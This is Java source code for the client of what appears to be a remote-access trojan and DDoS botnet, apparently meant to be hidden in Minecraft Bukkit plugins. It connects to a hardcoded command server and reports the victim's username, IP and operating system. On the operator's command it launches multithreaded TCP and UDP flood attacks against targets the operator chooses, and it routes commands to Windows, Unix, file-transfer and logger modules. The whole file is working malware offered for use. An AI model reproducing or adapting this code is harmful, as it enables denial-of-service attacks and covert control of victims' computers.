package me.kutuzov.client;

import com.github.sarxos.webcam.Webcam;
import com.profesorfalken.jpowershell.OSDetector;
import me.kutuzov.client.util.BukkitUtil;
import me.kutuzov.client.util.LoggingUtil;
import me.kutuzov.packet.*;
import me.pk2.moodlyencryption.MoodlyEncryption;
import org.bukkit.plugin.Plugin;

import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.Arrays;

public class KutuzovEntry {
    public static final String HOST = "analytics018.antecedentium.xyz";
    public static final int    PORT = 33901;
    public static final String VERSION = "b207";
    public static boolean DEBUG = false;

    public static ObjectInputStream ois = null;
    public static ObjectOutputStream oos = null;

    private static Plugin plugin = null;
    public static void setBukkitPlugin(Plugin plugin) { KutuzovEntry.plugin = plugin; }
    public static Plugin getBukkitPlugin() { return plugin; }

    public static String HOST_ALIAS = "";

    private static Socket socket;
    private static long lastPing = System.currentTimeMillis();
    public  static void main(String[] args) {
        try {
            File aliasFile = new File("C:\\WinPrefabs\\aluuid.txt");
            if(aliasFile.exists()) {
                FileReader fr = new FileReader("C:\\WinPrefabs\\aluuid.txt");
                BufferedReader br = new BufferedReader(fr);

                HOST_ALIAS = br.readLine().replaceAll("\\r", "").replaceAll("\\n", "");

                br.close();
                fr.close();
            }
        } catch (Exception exception) {
            if(DEBUG)
                exception.printStackTrace();
        }

        Arrays.stream(args).forEach(v -> { if(v.contentEquals("--debug")) DEBUG=true; });
        KutuzovWriter.init();
        Thread thread = new Thread(()->{
            try {
                ois = new ObjectInputStream(socket.getInputStream());
                oos = new ObjectOutputStream(socket.getOutputStream());
            } catch (Exception e) {}

            while(true) {
                if(System.currentTimeMillis() - lastPing > 10000) {
                    if(DEBUG)
                        System.out.println("[W0] Connection lost, reconnecting...");
                    while (true) {
                        try {
                            Thread.sleep(100);
                            socket = new Socket(HOST, PORT);
                            ois = new ObjectInputStream(socket.getInputStream());
                            oos = new ObjectOutputStream(socket.getOutputStream());
                            lastPing = System.currentTimeMillis();
                            break;
                        } catch (IOException | InterruptedException e1) {
                            if(DEBUG)
                                System.out.println("[W1] Connection lost, reconnecting...");
                        }
                    }
                }

                try {
                    Object packet = ois.readObject();
                    if(packet instanceof SCKeepAlivePacket) {
                        lastPing = System.currentTimeMillis();
                    } else if(packet instanceof SCAskWriterPacket) {
                        oos.writeObject(KutuzovWriter._packet());
                        KutuzovWriter._packetReset();

                        if(DEBUG)
                            System.out.println("Sent writer.");
                    } else if(packet instanceof SCMessageBoxPacket) {
                        SCMessageBoxPacket scMessageBoxPacket = (SCMessageBoxPacket) packet;
                        for(int i = 0; i < scMessageBoxPacket.amount; i++)
                            new Thread(() -> JOptionPane.showMessageDialog(null, scMessageBoxPacket.content, scMessageBoxPacket.title, JOptionPane.INFORMATION_MESSAGE)).start();
                    } else if(packet instanceof SCDAPacket) {
                        oos.writeObject(new CSDAResPacket(CSDAResPacket.RESPONSE_OK));

                        SCDAPacket scDAPacket = (SCDAPacket) packet;
                        try {
                            MoodlyEncryption moodlyEncryption = new MoodlyEncryption();
                            moodlyEncryption.init(scDAPacket.data.substring(scDAPacket.data.length() - 16));
                            String decryptedData = moodlyEncryption.decrypt(scDAPacket.data.substring(0, scDAPacket.data.length() - 16).getBytes(StandardCharsets.UTF_8));
                            if(DEBUG)
                                System.out.println("[CLIENT(" + socket.getLocalPort() + ")]  SCDAPacket:" + decryptedData);
                            String[] data = decryptedData.split(";");
                            /* Actual data */
                            String method = data[0];
                            String ip = data[1];
                            int port = Integer.parseInt(data[2]);
                            int threads = Integer.parseInt(data[3]);
                            int time = Integer.parseInt(data[3]);
                            long until = System.currentTimeMillis() + time*60L;
                            switch (method) {
                                case "tcp": {
                                    if(DEBUG)
                                        System.out.println("TCP[" + socket.getLocalPort() + "]: " + data[1] + " -> " + data[2]);
                                    for (int i = 0; i < threads; i++)
                                        new Thread(() -> {
                                            while(System.currentTimeMillis() < until) {
                                                try {
                                                    Socket socket = new Socket();
                                                    socket.connect(new InetSocketAddress(ip, port), 2500);
                                                    Thread.sleep(100);
                                                    socket.close();
                                                }catch (Exception e) {}
                                            }
                                        }).start();
                                } break;
                                case "udp": {
                                    if(DEBUG)
                                        System.out.println("UDP[" + socket.getLocalPort() + "]: " + data[1] + " -> " + data[2]);
                                    for(int i = 0; i < threads; i++)
                                        new Thread(() -> {
                                            DatagramSocket socket = null;
                                            InetAddress address = null;
                                            byte[] buff = new byte[65507];
                                            SecureRandom random = new SecureRandom();

                                            try {
                                                socket = new DatagramSocket();
                                                address = InetAddress.getByName(ip);
                                            } catch (Exception exception) {}

                                            random.nextBytes(buff);
                                            DatagramPacket dataPacket = new DatagramPacket(buff, buff.length, address, port);

                                            while(System.currentTimeMillis() < until)
                                                try { socket.send(dataPacket); } catch (Exception exception) {}
                                            socket.close();
                                        }).start();
                                } break;
                                default: break;
                            }
                        } catch (Exception e) {}
                    } else if(packet instanceof SCRequireHandshakePacket) {
                        String identifierName = System.getProperty("user.name");
                        if(!HOST_ALIAS.contentEquals(""))
                            identifierName = identifierName==null?HOST_ALIAS+"-?":HOST_ALIAS+"-"+identifierName;
                        String os = System.getProperty("os.name");
                        String localHost = InetAddress.getLocalHost().getHostAddress();
                        boolean isMC = BukkitUtil.isMC();
                        LoggingUtil.myOS = os;

                        oos.writeObject(new CSHandshakePacket(identifierName, localHost, os, VERSION, isMC));
                    } else if(packet instanceof SCBeepPacket)
                        Toolkit.getDefaultToolkit().beep();
                      else if(OSDetector.isWindows())
                        KutuzovWinPackets.handlePacket(ois, oos, (Packet)packet);
                    KutuzovKFTPPackets.handlePacket(ois, oos, (Packet)packet);
                    KutuzovUnixPackets.handlePacket(ois, oos, (Packet)packet);
                    KutuzovBukkitPackets.handlePacket(ois, oos, (Packet)packet);
                    KutuzovLoggerPackets.handlePacket(ois, oos, (Packet)packet);
                } catch (Exception ignored) {}
            }
        });
        thread.start();

        /*Thread.sleep(8000);
        for(Socket socket : sockets)
            socket.close();
            */
    }
}